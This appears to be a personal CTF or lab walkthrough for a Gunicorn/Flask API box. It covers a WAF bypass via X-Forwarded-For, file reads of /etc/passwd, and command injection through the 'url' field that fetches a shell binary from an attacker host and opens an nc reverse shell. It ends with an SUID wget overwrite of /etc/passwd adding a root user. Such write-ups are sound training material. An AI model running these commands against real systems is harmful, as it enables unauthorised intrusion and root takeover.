### Enumeration
```
IP=192.168.170.134
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,13337 -A $IP
nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
```
### Ports
- Banner Grab: nc -nv $IP PORT
- 22
	- OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	- nc -nv $IP 22
		- SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
- 13337
	- Gunicorn 20.0.4 API
	- nc -nv $IP 13337
		- ?
### Foothold
- 13337
	- searchsploit gunicorn
		- No results
	- Default page
		- ![[Pasted image 20240814155846.png]]
		- /logs
			- WAF: Access Denied for this Host
			- WAF Bypass
				- Port swigger talked about  X-Forwarded-For: 127.0.0.1
				- ![[Pasted image 20240814161042.png]]
				- Added this tor request
				- ![[Pasted image 20240814161028.png]]
				- Talks about no file and gives description: file=/path/to/log/file
				- ![[Pasted image 20240814161136.png]]
				- Dumps etc/passwd
					- root
					- clumsyadmin
				- Check source code
					- File=main.py
						- flask
						- Update portion that reaches out to http server
							- `os.system("curl {} -o /home/clumsyadmin/app".format(data['url']))
						- Might be able to breakout
							- `curl -X POST http://192.168.170.134:13337/update -H "Content-Type: application/json" -d '{"user":"clumsyadmin","url":"http://192.168.45.163/shell-x64.elf ; curl http://192.168.45.163/test"}'
							- The ; splits into another command
								- ![[Pasted image 20240814162257.png]]
								- Maybe put rev shell code?
									- Put busybox rev shell. Connects then dies
									- Used normal nc shell and it stays connected
		- /version
			- 1.0.0b8f887f33975ead915f336f57f0657180
		- /update
			- `curl -X POST http://192.168.170.134:13337/update -H "Content-Type: application/json" -d '{"user":"www-data"}'
				- invalid username
			- curl -X POST http://192.168.170.134:13337/update -H "Content-Type: application/json" -d '{"user":"clumsyadmin","url":"http://192.168.45.163/test.txt"}'
				- Grabs the file from my python http server
### PE
#### Linux
- clumsyadmin
	- id
		- uid=1000(clumsyadmin) gid=1000(clumsyadmin) groups=1000(clumsyadmin)
	- sudo -l
		- needs password
	- uname -a
		- `Linux xposedapi 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64 GNU/Linux
	- getcap -r / 2>/dev/null
		- ping
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
			- wget
				- https://gtfobins.github.io/gtfobins/wget/
				- We are rooted
				- ![[Pasted image 20240814164255.png]]
				- Could also write to /etc/passwd
					- `user3:$1$user3$rAGRVf5p2jYTqtqOW5cPu/:0:0:/root/root:/bin/bash
						- pass123
						- Write to a file on kali and host it with python http server
					- `wget -O /etc/passwd [http://192.168.49.112/passwd](http://192.168.49.112/passwd)
					- Then su user3
						- pass123
### Credentials
### Lessons Learned
- Make sure browser burp is on or off
- Try different payloads. Probably 5 then move on